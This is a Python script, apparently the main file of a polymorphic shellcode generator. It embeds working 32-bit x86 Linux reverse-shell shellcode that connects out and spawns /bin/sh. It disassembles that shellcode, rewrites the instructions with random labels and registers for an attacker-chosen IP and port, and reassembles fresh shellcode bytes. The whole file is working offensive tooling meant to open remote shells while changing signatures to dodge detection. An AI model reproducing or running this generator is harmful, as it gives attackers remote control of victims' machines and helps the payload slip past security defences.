from capstone import *
from pwn import asm, context
import random
import sys

from utilityFuncs import is_valid_ipv4, genRandomString, getRandomRegister
from shellcodeGen import get_modified_instructions

# Original Shellcode of the Reverse shell in NASM 
shellcode = b"\x89\xe5\x31\xc0\xb8\x00\x00\x00\x00\x31\xc9\x31\xd2\x50\x50\xb8\xff\xff\xff\xff\xbb\x80\xff\xff\xfe\x31\xc3\x53\x66\x68\x11\x5c\x66\x6a\x02\x31\xc0\x31\xdb\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x41\xe2\xf6\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

# Check if all args are given and are valid
if len(sys.argv) < 3:
    print("Usage: python3 main.py <IP_ADDRESS> <PORT>")
    sys.exit(1)

ip_address = sys.argv[1]
port = sys.argv[2]

try:
    port = int(port)
    if not 1 <= port <= 65535:
        print("Invalid port: Port number must be between 1 and 65535")
        sys.exit(1)
except ValueError:
    print("Invalid port: Port number must be an integer")
    sys.exit(1)

if not is_valid_ipv4(ip_address):
    print("Invalid IP address")
    sys.exit(1)

md = Cs(CS_ARCH_X86, CS_MODE_32)
# Get ASM instructions from shellcode in a list
listOfInstructs = list(md.disasm(shellcode, 0x1000))

# Print instructions
for i in listOfInstructs:
    print("0x%x: %s\t%s" % (i.address, i.mnemonic, i.op_str))

print("\n===========================\n\nNew Generated instructions :\n")

# Generate random label
random_label = genRandomString(random.randint(1, 9))
# Get random reg.. duh
reg = getRandomRegister()

# New generated reverseshell asm code
modifiedInstructs = get_modified_instructions(listOfInstructs, random_label, reg, ip_address, port)

# Prepare the new instructions for assembly
modAsm = "\n".join(modifiedInstructs) + "\n"

# Print newly generated code
print(modAsm)

# Assemble instructions and print new shellcode
context.update(arch="i386")
shellcode = asm(modAsm)

# Format shellcode string to add it to the C tester code
shellcode_str = ''.join([f"\\x{b:02x}" for b in shellcode])

print(f"Shellcode : \"{shellcode_str}\"")

